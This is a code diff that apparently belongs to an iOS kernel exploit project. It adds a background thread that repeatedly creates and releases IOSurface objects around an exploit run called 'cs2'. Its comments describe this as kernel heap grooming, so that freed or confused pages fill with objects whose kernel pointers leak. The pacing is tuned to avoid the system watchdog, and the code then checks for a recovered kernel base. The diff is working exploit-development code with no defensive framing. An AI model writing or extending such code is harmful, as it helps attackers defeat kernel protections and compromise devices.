@@ -2,6 +2,9 @@
 #import "LabRuntimeOffsets.h"
 #import "LabDeviceProfile.h"
 #import "../P007Board.h"
+#import <dlfcn.h>
+#include <pthread.h>
+#include <pthread/qos.h>
 #import "../LabHeapAnchor.h"
 
 // cs2 core (verbatim upstream, prefixed)
@@ -199,6 +202,44 @@ static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
     return *explicit_arm && n >= 1;
 }
 
+
+typedef struct __IOSurface *IOSurfaceRef;
+/* 2026-11-19 IOSurface churn AROUND cs2_run (the user's receipt: solo cs2
+   = 0 hits; simultaneous cskrw opens windows but content lands on random
+   slab pages). The p159 anchors are IOSurface-adjacency kernel heap VAs —
+   churn that SAME object family for the whole scan so freed/confused
+   pages get recycled by IOSurface kernel objects whose OWN kptr fields
+   are real disclosures. UTILITY QoS + 25 ms pacing = no watchdog class. */
+static volatile int g_cs2SurfChurnGo = 0;
+typedef IOSurfaceRef (*cs2_surfcreate_t)(CFDictionaryRef);
+static void *cs2_surf_churn_thread(void *arg) {
+    (void)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_UTILITY, 0);
+    cs2_surfcreate_t pCr = (cs2_surfcreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+    if (!pCr) return NULL;
+    int32_t w = 64, h = 64, bpe = 4;
+    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
+    CFNumberRef nb = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpe);
+    const void *ck[3] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"), CFSTR("IOSurfaceBytesPerElement") };
+    const void *cv[3] = { nw, nh, nb };
+    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, ck, cv, 3,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFRelease(nw); CFRelease(nh); CFRelease(nb);
+    uint64_t cycles = 0;
+    while (g_cs2SurfChurnGo) {
+        for (int i = 0; i < 8 && g_cs2SurfChurnGo; i++) {
+            IOSurfaceRef s = pCr(props);
+            if (s) CFRelease(s);
+            cycles++;
+        }
+        usleep(25000);
+    }
+    if (props) CFRelease(props);
+    cs2_log("[anchor-churn] IOSurface churn stopped (cycles=%llu)", (unsigned long long)cycles);
+    return NULL;
+}
+
 @implementation CS2Runner
 
 + (NSString *)runUpstream {
@@ -274,8 +315,16 @@ static BOOL lsword_arm_licensed(int *windows, BOOL *explicit_arm) {
     cs2_stop = 0;
     cs2_deadline = time(NULL) + CS2_TIME_BUDGET_SEC;
 
+    pthread_t thSurfChurn = 0;
+    g_cs2SurfChurnGo = 1;
+    if (pthread_create(&thSurfChurn, NULL, cs2_surf_churn_thread, NULL) == 0)
+        cs2_log("[anchor-churn] IOSurface churn LIVE for the whole scan (p159-family, 25 ms pacing)");
+    else { g_cs2SurfChurnGo = 0; thSurfChurn = 0; }
+
     int ret = cs2_run();
     cs2_stop = 1;
+    g_cs2SurfChurnGo = 0;
+    if (thSurfChurn) pthread_join(thSurfChurn, NULL);
 
     NSMutableString *out = [NSMutableString string];
     if (ret == 0 && cs2_ctx.kernel_base != 0) {
